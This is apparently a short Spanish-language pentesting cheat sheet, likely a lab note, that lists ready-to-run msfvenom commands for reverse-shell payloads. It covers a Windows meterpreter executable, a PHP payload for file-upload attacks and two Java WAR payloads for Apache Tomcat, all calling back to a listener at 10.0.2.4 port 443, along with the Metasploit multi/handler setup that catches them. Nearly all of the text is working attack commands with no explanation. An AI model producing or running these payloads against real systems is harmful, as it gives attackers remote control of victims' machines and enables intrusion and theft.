
**WINDOWS**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=443 -f exe -o pwned.exe #1
```

```Metasploit
use /multi/handler
show options
set LHOST 10.0.2.4
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
Para ver mas ir a [[Windows 7 (Eternalblue, Metasploit)]]

**PHP(File Upload)**
```bash
msfvenom -p php/reverse_php LHOST=10.0.2.4 LPORT=443 -f raw -o pwned.php
```

**APACHE TOMCAT**
Aqui hay dos opciones por si no funciona una usar la otra
```shell
msfvenom -p java/shell_reverse_tcp LHOST=10.0.2.4 LPORT=443 -f war -o pwned.war
msfvenom -p java/jsp_shell_reverse_tcp  LHOST=10.0.2.4 LPORT=443 -f war -o pwned2.war
```